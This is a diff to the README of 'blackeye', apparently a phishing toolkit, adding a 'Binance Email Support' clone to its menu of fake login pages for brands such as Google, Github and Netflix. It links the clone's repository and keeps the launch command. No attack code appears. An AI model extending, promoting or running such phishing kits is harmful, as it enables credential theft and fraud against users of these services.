@@ -11,6 +11,8 @@
 
 ![alt text](https://raw.githubusercontent.com/EricksonAtHome/blackeye/main/img/bankofa.png)
 
+[New Binance Email Support Clone for BLACKEYE v3.1 ](https://github.com/EricksonAtHome/bes)
+
 ### UPDATES :
 ##### UPDATES_TMP websites :          
 
@@ -21,7 +23,8 @@
           [05] Github         [21] GitLab         [37] Netflix          
           [06] Google         [22] Twitch         [38] Reddit         
           [07] Origin         [23] MySpace        [39] StackOverflow         
-          [08] Yahoo          [24] Badoo          [40] Custom         
+          [08] Yahoo          [24] Badoo          [40] Custom      
+                                                  [41] Binance Email Support     
           [09] Linkedin       [25] VK                      
           [10] Protonmail     [26] Yandex                  
           [11] Wordpress      [27] devianART               
@@ -59,7 +62,7 @@ cd blackeye
 bash blackeye.sh
 ```
 
-![alt text](https://raw.githubusercontent.com/EricksonAtHome/blackeye/main/img/hiws.png)
+![alt text](https://raw.githubusercontent.com/EricksonAtHome/blackeye/main/img/hiws2.png)
 
 ### Donate! @EricksonHolding
 Donate And Support:
